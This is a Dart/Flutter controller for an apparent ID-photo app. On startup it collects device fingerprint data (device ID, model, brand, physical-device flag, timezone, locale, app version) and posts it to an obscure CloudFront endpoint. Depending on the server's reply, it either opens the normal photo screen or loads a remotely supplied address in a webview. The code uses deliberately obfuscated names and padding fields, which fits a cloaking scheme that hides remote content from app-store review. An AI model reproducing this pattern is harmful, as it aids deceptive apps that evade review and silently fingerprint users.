import 'dart:io';

import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:get/get.dart';


class IdPhotoInitLogic extends GetxController {

  var evziduwts = RxBool(false);
  var mrjxaewkt = RxBool(true);
  var ciaujro = RxString("");
  var garret = RxBool(false);
  var jerde = RxBool(true);
  final gulwkzmit = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    debyphn();
  }


  Future<void> debyphn() async {
    garret.value = true;
    jerde.value = true;
    mrjxaewkt.value = false;

    gulwkzmit.post("https://d19exn1w0hw4gm.cloudfront.net/EEbwyft9",data: await pcvorlnb()).then((value) {
      var zsmb = value.data["zsmb"] as String;
      var vbnzid = value.data["vbnzid"] as bool;
      if (vbnzid) {
        ciaujro.value = zsmb;
        kurtis();
      } else {
        sanford();
      }
    }).catchError((e) {
      mrjxaewkt.value = true;
      jerde.value = true;
      garret.value = false;
    });
  }

  Future<Map<String, dynamic>> pcvorlnb() async {
    final DeviceInfoPlugin nhoif = DeviceInfoPlugin();
    PackageInfo cybo_orudzqv = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var cujyz = Platform.localeName;
    var ZbLG = currentTimeZone;

    var idtRnW = cybo_orudzqv.packageName;
    var CbIWUOM = cybo_orudzqv.version;
    var xaDf = cybo_orudzqv.buildNumber;

    var aERG = cybo_orudzqv.appName;
    var oxHId = "";
    var hZiw  = "";
    var WKMopmyV = "";
    var othoVeum = "";
    var shakiraWiza = "";
    var revaBednar = "";
    var londonSchulist = "";
    var adrienBuckridge = "";
    var dedrickRogahn = "";
    var soniaDaniel = "";
    var alfonzoKozey = "";


    var DnhprXd = "";
    var BvAzOh = false;

    if (GetPlatform.isAndroid) {
      DnhprXd = "android";
      var pwybqhzn = await nhoif.androidInfo;

      WKMopmyV = pwybqhzn.brand;

      oxHId  = pwybqhzn.model;
      hZiw = pwybqhzn.id;

      BvAzOh = pwybqhzn.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      DnhprXd = "ios";
      var vufgtoi = await nhoif.iosInfo;
      WKMopmyV = vufgtoi.name;
      oxHId = vufgtoi.model;

      hZiw = vufgtoi.identifierForVendor ?? "";
      BvAzOh  = vufgtoi.isPhysicalDevice;
    }
    var res = {
      "aERG": aERG,
      "CbIWUOM": CbIWUOM,
      "idtRnW": idtRnW,
      "ZbLG": ZbLG,
      "WKMopmyV": WKMopmyV,
      "londonSchulist" : londonSchulist,
      "hZiw": hZiw,
      "cujyz": cujyz,
      "DnhprXd": DnhprXd,
      "BvAzOh": BvAzOh,
      "dedrickRogahn" : dedrickRogahn,
      "othoVeum" : othoVeum,
      "shakiraWiza" : shakiraWiza,
      "revaBednar" : revaBednar,
      "adrienBuckridge" : adrienBuckridge,
      "oxHId": oxHId,
      "soniaDaniel" : soniaDaniel,
      "xaDf": xaDf,
      "alfonzoKozey" : alfonzoKozey,

    };
    return res;
  }

  Future<void> sanford() async {
    Get.offNamed("/photo_main");
  }

  Future<void> kurtis() async {
    Get.offNamed("/id_photo_rish");
  }

}
